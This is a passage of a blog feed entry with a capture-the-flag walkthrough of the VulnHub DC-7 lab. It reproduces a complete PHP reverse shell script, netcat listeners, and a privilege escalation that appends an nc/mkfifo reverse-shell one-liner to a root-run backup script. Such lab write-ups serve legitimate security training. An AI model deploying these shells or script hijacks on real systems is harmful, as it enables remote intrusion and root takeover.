class="string">&quot;1.0&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;192.168.1.6&#x27;</span>;  // CHANGE THIS</span><br><span class="line"><span class="variable">$port</span> = 9001;       // CHANGE THIS</span><br><span class="line"><span class="variable">$chunk_size</span> = 1400;</span><br><span class="line"><span class="variable">$write_a</span> = null;</span><br><span class="line"><span class="variable">$error_a</span> = null;</span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&#x27;uname -a; w; id; /bin/sh -i&#x27;</span>;</span><br><span class="line"><span class="variable">$daemon</span> = 0;</span><br><span class="line"><span class="variable">$debug</span> = 0;</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">// Daemonise ourself <span class="keyword">if</span> possible to avoid zombies later</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">// pcntl_fork is hardly ever available, but will allow us to daemonise</span><br><span class="line">// our php process and avoid zombies.  Worth a try...</span><br><span class="line"><span class="keyword">if</span> (function_exists(<span class="string">&#x27;pcntl_fork&#x27;</span>)) &#123;</span><br><span class="line">        // Fork and have the parent process <span class="built_in">exit</span></span><br><span class="line">        <span class="variable">$pid</span> = pcntl_fork();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pid</span> == -1) &#123;</span><br><span class="line">                printit(<span class="string">&quot;ERROR: Can&#x27;t fork&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pid</span>) &#123;</span><br><span class="line">                <span class="built_in">exit</span>(0);  // Parent exits</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Make the current process a session leader</span><br><span class="line">        // Will only succeed <span class="keyword">if</span> we forked</span><br><span class="line">        <span class="keyword">if</span> (posix_setsid() == -1) &#123;</span><br><span class="line">                printit(<span class="string">&quot;Error: Can&#x27;t setsid()&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$daemon</span> = 1;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        printit(<span class="string">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Change to a safe directory</span><br><span class="line"><span class="built_in">chdir</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line">// Remove any <span class="built_in">umask</span> we inherited</span><br><span class="line"><span class="built_in">umask</span>(0);</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">// Do the reverse shell...</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">// Open reverse connection</span><br><span class="line"><span class="variable">$sock</span> = fsockopen(<span class="variable">$ip</span>, <span class="variable">$port</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, 30);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$sock</span>) &#123;</span><br><span class="line">        printit(<span class="string">&quot;<span class="variable">$errstr</span> (<span class="variable">$errno</span>)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Spawn shell process</span><br><span class="line"><span class="variable">$descriptorspec</span> = array(</span><br><span class="line">   0 =&gt; array(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;r&quot;</span>),  // stdin is a pipe that the child will <span class="built_in">read</span> from</span><br><span class="line">   1 =&gt; array(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>),  // stdout is a pipe that the child will write to</span><br><span class="line">   2 =&gt; array(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>)   // stderr is a pipe that the child will write to</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$process</span> = proc_open(<span class="variable">$shell</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_resource(<span class="variable">$process</span>)) &#123;</span><br><span class="line">        printit(<span class="string">&quot;ERROR: Can&#x27;t spawn shell&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Set everything to non-blocking</span><br><span class="line">// Reason: Occsionally reads will block, even though stream_select tells us they won<span class="string">&#x27;t</span></span><br><span class="line"><span class="string">stream_set_blocking($pipes[0], 0);</span></span><br><span class="line"><span class="string">stream_set_blocking($pipes[1], 0);</span></span><br><span class="line"><span class="string">stream_set_blocking($pipes[2], 0);</span></span><br><span class="line"><span class="string">stream_set_blocking($sock, 0);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">printit(&quot;Successfully opened reverse shell to $ip:$port&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">while (1) &#123;</span></span><br><span class="line"><span class="string">        // Check for end of TCP connection</span></span><br><span class="line"><span class="string">        if (feof($sock)) &#123;</span></span><br><span class="line"><span class="string">                printit(&quot;ERROR: Shell connection terminated&quot;);</span></span><br><span class="line"><span class="string">                break;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        // Check for end of STDOUT</span></span><br><span class="line"><span class="string">        if (feof($pipes[1])) &#123;</span></span><br><span class="line"><span class="string">                printit(&quot;ERROR: Shell process terminated&quot;);</span></span><br><span class="line"><span class="string">                break;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        // Wait until a command is end down $sock, or some</span></span><br><span class="line"><span class="string">        // command output is available on STDOUT or STDERR</span></span><br><span class="line"><span class="string">        $read_a = array($sock, $pipes[1], $pipes[2]);</span></span><br><span class="line"><span class="string">        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        // If we can read from the TCP socket, send</span></span><br><span class="line"><span class="string">        // data to process&#x27;</span>s STDIN</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$sock</span>, <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;SOCK READ&quot;</span>);</span><br><span class="line">                <span class="variable">$input</span> = fread(<span class="variable">$sock</span>, <span class="variable">$chunk_size</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;SOCK: <span class="variable">$input</span>&quot;</span>);</span><br><span class="line">                fwrite(<span class="variable">$pipes</span>[0], <span class="variable">$input</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // If we can <span class="built_in">read</span> from the process<span class="string">&#x27;s STDOUT</span></span><br><span class="line"><span class="string">        // send data down tcp connection</span></span><br><span class="line"><span class="string">        if (in_array($pipes[1], $read_a)) &#123;</span></span><br><span class="line"><span class="string">                if ($debug) printit(&quot;STDOUT READ&quot;);</span></span><br><span class="line"><span class="string">                $input = fread($pipes[1], $chunk_size);</span></span><br><span class="line"><span class="string">                if ($debug) printit(&quot;STDOUT: $input&quot;);</span></span><br><span class="line"><span class="string">                fwrite($sock, $input);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        // If we can read from the process&#x27;</span>s STDERR</span><br><span class="line">        // send data down tcp connection</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$pipes</span>[2], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;STDERR READ&quot;</span>);</span><br><span class="line">                <span class="variable">$input</span> = fread(<span class="variable">$pipes</span>[2], <span class="variable">$chunk_size</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;STDERR: <span class="variable">$input</span>&quot;</span>);</span><br><span class="line">                fwrite(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fclose(<span class="variable">$sock</span>);</span><br><span class="line">fclose(<span class="variable">$pipes</span>[0]);</span><br><span class="line">fclose(<span class="variable">$pipes</span>[1]);</span><br><span class="line">fclose(<span class="variable">$pipes</span>[2]);</span><br><span class="line">proc_close(<span class="variable">$process</span>);</span><br><span class="line"></span><br><span class="line">// Like <span class="built_in">print</span>, but does nothing <span class="keyword">if</span> we<span class="string">&#x27;ve daemonised ourself</span></span><br><span class="line"><span class="string">// (I can&#x27;</span>t figure out how to redirect STDOUT like a proper daemon)</span><br><span class="line"><span class="keyword">function</span> printit (<span class="variable">$string</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$daemon</span>) &#123;</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&quot;<span class="variable">$string</span>\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><img src="/2020/08/28/DC-7/image-20200828204106538.png" class><img src="/2020/08/28/DC-7/image-20200828204128295.png" class><h3 id="2-kaliç›‘å¬"><a href="#2-kaliç›‘å¬" class="headerlink" title="2.kaliç›‘å¬"></a>2.kaliç›‘å¬</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc7<span class="comment"># nc -nvlp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-ä¿å­˜æµè§ˆ"><a href="#3-ä¿å­˜æµè§ˆ" class="headerlink" title="3.ä¿å­˜æµè§ˆ"></a>3.ä¿å­˜æµè§ˆ</h3><img src="/2020/08/28/DC-7/image-20200828214351504.png" class><h3 id="4-kali-get-shell"><a href="#4-kali-get-shell" class="headerlink" title="4.kali get shell"></a>4.kali get shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 9001</span></span><br><span class="line">listening on [any] 9001 ...</span><br><span class="line">connect to [192.168.1.6] from (UNKNOWN) [192.168.1.8] 39786</span><br><span class="line">Linux dc-7 4.9.0-9-amd64 <span class="comment">#1 SMP Debian 4.9.168-1+deb9u5 (2019-08-11) x86_64 GNU/Linux</span></span><br><span class="line"> 23:43:02 up  3:49,  0 users,  load average: 0.01, 0.02, 0.00</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$</span></span><br></pre></td></tr></table></figure><h3 id="5-å‡çº§shell"><a href="#5-å‡çº§shell" class="headerlink" title="5.å‡çº§shell"></a>5.å‡çº§shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">www-data@dc-7:/$ id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">www-data@dc-7:/$ whoami</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">www-data@dc-7:/$ </span><br></pre></td></tr></table></figure><h3 id="5-å‡çº§äº¤äº’shell"><a href="#5-å‡çº§äº¤äº’shell" class="headerlink" title="5.å‡çº§äº¤äº’shell"></a>5.å‡çº§äº¤äº’shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-7:/$ ^Z</span><br><span class="line">[1]+  å·²åœæ­¢               nc -nvlp 9001</span><br><span class="line">root@JIYE:~<span class="comment"># stty raw -echo</span></span><br><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 9001</span></span><br><span class="line"></span><br><span class="line">www-data@dc-7:/$ whoami</span><br><span class="line">www-data</span><br><span class="line">www-data@dc-7:/$</span><br></pre></td></tr></table></figure><h2 id="0x08-ææƒ"><a href="#0x08-ææƒ" class="headerlink" title="0x08.ææƒ"></a>0x08.ææƒ</h2><p><code>backupså…·æœ‰æ‰§è¡Œæƒé™ï¼Œæ‰€ä»¥åˆ©ç”¨ä»–ææƒ</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-7:/var/mail$ <span class="built_in">cd</span> /opt/scripts/</span><br><span class="line">www-data@dc-7:/opt/scripts$ ls</span><br><span class="line">backups.sh</span><br><span class="line">www-data@dc-7:/opt/scripts$ </span><br><span class="line">www-data@dc-7:/opt/scripts$ ls -l backups.sh </span><br><span class="line">-rwxrwxr-x 1 root www-data 520 Aug 29  2019 backups.sh</span><br><span class="line">www-data@dc-7:/opt/scripts$</span><br></pre></td></tr></table></figure><p><code>ç¼–è¾‘æ–‡ä»¶</code><span class="exturl" data-url="aHR0cDovL3BlbnRlc3Rtb25rZXkubmV0L2NoZWF0LXNoZWV0L3NoZWxscy9yZXZlcnNlLXNoZWxsLWNoZWF0LXNoZWV0">å‚è€ƒ<i class="fa fa-external-link-alt"></i></span></p><blockquote><p>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.1.6 9002 &gt;/tmp/f</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-7:/opt/scripts<span class="variable">$echo</span> <span class="string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.1.6 9002 &gt;/tmp/f&quot;</span> &gt;&gt; backups.sh</span><br><span class="line">www-data@dc-7:/opt/scripts$ cat backups.sh </span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">rm /home/dc7user/backups/*</span><br><span class="line"><span class="built_in">cd</span> /var/www/html/</span><br><span class="line">drush sql-dump --result-file=/home/dc7user/backups/website.sql</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">tar -czf /home/dc7user/backups/website.tar.gz html/</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz</span><br><span class="line">chown dc7user:dc7user /home/dc7user/backups/*</span><br><span class="line">rm /home/dc7user/backups/website.sql</span><br><span class="line">rm /home/dc7user/backups/website.tar.gz</span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.1.6 9002 &gt;/tmp/f</span><br><span class="line">www-data@dc-7:/opt/scripts$</span><br></pre></td></tr></table></figure><p><code>kaliç›‘å¬</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 9002</span></span><br><span class="line">listening on [any] 9002 ...</span><br><span class="line">connect to [192.168.1.6] from (UNKNOWN) [192.168.1.8] 45590</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string"># python -c &#x27;</span>import pty;pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">root@dc-7:/var/www# cd</span></span><br><span class="line"><span class="string">cd</span></span><br><span class="line"><span class="string">root@dc-7:~# ls</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">theflag.txt</span></span><br><span class="line"><span class="string">root@dc-7:~# cat theflag.txt </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">888       888          888 888      8888888b.                             888 888 888 888 </span></span><br><span class="line"><span class="string">888   o   888          888 888      888  &quot;Y88b                            888 888 888 888 </span></span><br><span class="line"><span class="string">888  d8b  888          888 888      888    888                            888 888 888 888 </span></span><br><span class="line"><span class="string">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 </span></span><br><span class="line"><span class="string">888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888 </span></span><br><span class="line"><span class="string">88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P </span></span><br><span class="line"><span class="string">8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;  </span></span><br><span class="line"><span class="string">888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulations!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Hope you enjoyed DC-7.  Just wanted to send a big thanks out there to all those</span></span><br><span class="line"><span class="string">who have provided feedback, and all those who have taken the time to complete these little</span></span><br><span class="line"><span class="string">challenges.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">I&#x27;</span>m sending out an especially big thanks to:</span><br><span class="line"></span><br><span class="line">@4nqr34z</span><br><span class="line">@D4mianWayne</span><br><span class="line">@0xmzfr</span><br><span class="line">@theart42</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br><span class="line"></span><br><span class="line">root@dc-7:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-å®˜ç½‘æè¿°&quot;&gt;&lt;a href=&quot;#0x00-å®˜ç½‘æè¿°&quot; class=&quot;headerlink&quot; title=&quot;0x00.å®˜ç½‘æè¿°&quot;&gt;&lt;/a&gt;0x00.å®˜ç½‘æè¿°&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;DC-7 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.&lt;/p&gt;
&lt;p&gt;While this isnâ€™t an overly technical challenge, it isnâ€™t exactly easy.&lt;/p&gt;
&lt;p&gt;While itâ€™s kind of a logical progression from an earlier DC release (I wonâ€™t tell you which one), there are some new concepts involved, but you will need to figure those out for yourself. :-) If you need to resort to brute forcing or dictionary attacks, you probably wonâ€™t succeed.&lt;/p&gt;
&lt;p&gt;What you will need to do, is to think â€œoutsideâ€ of the box.&lt;/p&gt;
&lt;p&gt;Waaaaaay â€œoutsideâ€ of the box. :-)&lt;/p&gt;
&lt;p&gt;The ultimate goal of this challenge is to get root and to read the one and only flag.&lt;/p&gt;
&lt;p&gt;Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.&lt;/p&gt;
&lt;p&gt;For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I wonâ€™t give you the answer, instead, Iâ€™ll give you an idea about how to move forward.&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="vulnhub" scheme="https://lunamoore.github.io/categories/vulnhub/"/>
    
    <category term="DC" scheme="https://lunamoore.github.io/categories/vulnhub/DC/"/>
    
    
    <category term="é¶æœº" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
</feed>
